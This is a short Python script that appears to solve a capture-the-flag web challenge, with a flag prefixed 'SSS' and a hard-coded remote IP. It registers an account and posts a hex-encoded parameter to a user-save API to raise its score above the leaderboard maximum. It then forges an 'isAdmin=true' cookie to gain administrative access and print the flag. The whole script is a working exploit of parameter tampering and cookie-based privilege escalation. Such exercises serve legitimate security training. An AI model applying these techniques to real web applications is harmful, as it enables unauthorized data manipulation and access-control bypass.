import requests
import sys
import codecs

PORT = "7001"


def echo_usage():
    """Display script usage and exit."""

    print(f"Usage:\npython {sys.argv[0]} local/remote\nOR\npython {sys.argv[0]} IP PORT")
    sys.exit()


if __name__ == "__main__":
    if len(sys.argv) <= 1:
        echo_usage()

    if len(sys.argv) > 2:
        URL = f"http://{sys.argv[1]}:{sys.argv[2]}"
    elif sys.argv[1] == "local":
        URL = "http://127.0.0.1:" + PORT
    elif sys.argv[1] == "remote":
        URL = "http://141.85.224.115:" + PORT
    else:
        echo_usage()

    session = requests.Session()
    random_string = "sggwgewht"

    print("Creating an account with a random name...")
    register_data = {
        "username": random_string,
        "password": random_string,
        "email": random_string,
        "university": random_string,
        "faculty": random_string,
        "register": "Register",
    }
    session.post(URL + "/index.php", data=register_data)

    print("Logging in...")
    login_data = {
        "username": random_string,
        "password": random_string,
        "login": "Login",
    }
    session.post(URL + "/index.php", data=login_data)

    print("Getting the max score from the leaderboard...")
    res = session.get(URL + "/leaderboard.php")
    max_score = int(res.text.split(f"<li>{random_string} - ")[1].split(" points</li>")[0])

    print("Modifying our score to max_score + 1...")
    edit_data = {
        "q": codecs.encode(b"score=%d" % (max_score + 1), "hex").decode(),
    }
    session.post(URL + "/api-save-user.php", data=edit_data)

    print("Accessing the leaderboard again, with cookie isAdmin=true...")
    session.cookies.update({"isAdmin": "true"})
    res = session.get(URL + "/leaderboard.php")
    print("Flag is: SSS" + res.text.split("SSS")[1].split(" ")[0])
